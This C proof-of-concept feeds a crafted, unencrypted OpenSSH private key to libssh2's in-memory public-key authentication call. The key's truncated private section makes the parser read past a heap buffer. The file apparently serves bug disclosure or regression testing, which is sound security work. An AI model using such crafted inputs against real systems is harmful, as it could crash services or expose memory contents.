/*
 * PoC: crafted unencrypted ("none" cipher) openssh-key-v1 private key whose
 * private section ends immediately after the key type string. The section is
 * copied into a heap buffer sized exactly to its length, so the type string
 * is not NUL-terminated there; parsing it reads past the end of the buffer.
 *
 * Driven through the public API (libssh2_userauth_publickey_frommemory),
 * no network I/O involved.
 */

#include <stdio.h>
#include <string.h>

#include <libssh2.h>

static const char privkey[] =
    "-----BEGIN OPENSSH PRIVATE KEY-----\n"
    "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS\n"
    "1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQQRERERERERERERERERERERERERERER\n"
    "ERERERERERERERERERERERERERERERERERERERERERERERERERERERERAAAAHksdXipLHV\n"
    "4qAAAAEmVjZHNhLXNoYTItbmlzdHAyNQ==\n"
    "-----END OPENSSH PRIVATE KEY-----\n";

int main(void)
{
    LIBSSH2_SESSION *session;
    int rc;

    if(libssh2_init(0))
        return 1;

    session = libssh2_session_init();
    if(!session) {
        libssh2_exit();
        return 2;
    }

    rc = libssh2_userauth_publickey_frommemory(session, "user", 4,
                                               NULL, 0,
                                               privkey, strlen(privkey),
                                               NULL);

    {
        char *errmsg = NULL;
        int len = 0;
        libssh2_session_last_error(session, &errmsg, &len, 0);
        printf("libssh2_userauth_publickey_frommemory() -> %d: %s\n",
               rc, errmsg ? errmsg : "");
    }

    libssh2_session_free(session);
    libssh2_exit();

    return 0;
}
